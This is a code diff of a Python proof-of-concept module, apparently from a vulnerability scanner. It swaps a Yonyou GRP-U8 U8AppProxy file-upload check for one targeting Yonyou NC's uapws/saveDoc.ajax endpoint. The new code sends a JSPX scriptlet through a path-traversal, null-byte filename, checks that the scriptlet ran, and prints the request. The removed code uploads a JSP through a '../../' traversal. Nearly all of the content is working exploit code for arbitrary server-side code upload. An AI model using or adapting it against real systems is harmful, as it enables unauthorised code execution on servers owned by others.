@@ -1,8 +1,8 @@
 '''
 Function:
-    用友GRP-U8 U8AppProxy任意文件上传漏洞
+    yonyouNC saveDoc 文件上传
 Author:
-    spmonkey，夜梓月
+    花果山
 Wechat official account：
     中龙 红客突击队
 Official website：
@@ -16,52 +16,54 @@ GitHub:
 '''
 # -*- coding: utf-8 -*-
 import requests
-import os
-import sys
+import random
+import string
 from urllib.parse import urlparse
 from requests.packages.urllib3 import disable_warnings
 disable_warnings()
-path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-sys.path.append(path)
-from modules import get_user_agent
 
 
 class poc:
     def __init__(self, url, proxies):
         self.url = url
         self.headers = {
-            'User-Agent': get_user_agent.get_user_agent(),
-            "Cookie": "JSESSIONID=635F2271089E7A7E66F3F84824553DEE",
-            "Accept-Encoding": "gzip"
+            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
         }
-        self.proxies = proxies
+        self.value_list = []
         self.result_text = ""
+        self.proxies = proxies
 
     def host(self):
         url = urlparse(self.url)
         netloc = url.netloc
         scheme = url.scheme
-        return scheme, netloc
+        return netloc, scheme
 
     def vuln(self, netloc, scheme):
-        url = "{}://{}/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_test".format(scheme, netloc)
+        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
+        payload = "test" + char
+        url = "{}://{}/uapws/saveDoc.ajax?ws=/../../4627716.jspx%00".format(scheme, netloc)
         data = {
-        'file': ('1.jsp', '<% out.println("yongyouu8");%>', 'image/jpeg'),
-    }
+            "content": """<hi xmlns:hi="http://java.sun.com/JSP/Page">
+      <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
+   <hi:scriptlet>
+            out.println("{}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); 
+   </hi:scriptlet>
+</hi>""".format(payload),
+        }
         try:
-            result = requests.post(url=url, files=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
-            req = requests.get(url + "/yongyouU8_test.jsp", headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
-            if req.text.find("yongyouu8") != -1:
+            result = requests.post(url=url, data=data, proxies=self.proxies, headers=self.headers, verify=False, timeout=3)
+            if payload in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                  POST {} HTTP/1.1
                  Host: {}""".format(target.path, target.netloc)
                 for request_type, request_text in dict(result.request.headers).items():
                     self.result_text += "\n                 {}: {}".format(request_type, request_text)
-                self.result_text += "\n"
-                bodys = result.request.body.decode().split("\r\n")
-                for body in bodys:
-                    self.result_text += "\n                 {}".format(body)
+                for param, value in data.items():
+                    values = param + "=" + value
+                    self.value_list.append(values)
+                self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                 return True
             else:
                 return False
@@ -70,9 +72,10 @@ class poc:
 
     def main(self):
         all = self.host()
-        scheme = all[0]
-        netloc = all[1]
+        netloc = all[0]
+        scheme = all[1]
         if self.vuln(netloc, scheme):
              return self.result_text
         else:
             return False
+
